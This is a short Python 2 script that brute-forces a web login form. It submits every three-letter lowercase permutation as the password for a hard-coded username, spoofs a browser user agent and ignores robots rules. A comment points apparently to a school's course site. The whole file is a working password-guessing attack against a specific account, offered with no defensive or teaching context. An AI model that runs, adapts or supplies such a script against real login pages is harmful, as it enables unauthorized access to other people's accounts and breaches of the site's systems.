import mechanize  #pip install 
import itertools


possible_char="abcdefghijklmnopqrstuvwxyz"
length = 3

site_url = "" #the login website url

br = mechanize.Browser() 
br.set_handle_robots(False) 
br.addheaders = [("User-agent","Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.13) Gecko/20101206 Ubuntu/10.10 (maverick) Firefox/3.6.13")]   


pass_combos = itertools.permutations(possible_char,length) 

for password in pass_combos:
	sign_in = br.open(site_url) 
	br.select_form(name = "frmHTTPClientLogin") #Alternatively you may use this instead of the above line if your form has name attribute available.  
	
	br["username"] = "f2014584" #the key "username" is the variable that takes the username/email value   
	br["password"] = ''.join(password)   #the key "password" is the variable that takes the password value   
	
	logged_in = br.submit()   #submitting the login credentials   
	logincheck = logged_in.read()  #reading the page body that is redirected after successful login  
	print logincheck #printing the body of the redirected url after login   
	 
 	#req = br.open("http://school.dwit.edu.np/mod/assign/").read()  #accessing other url(s) after login is done this way

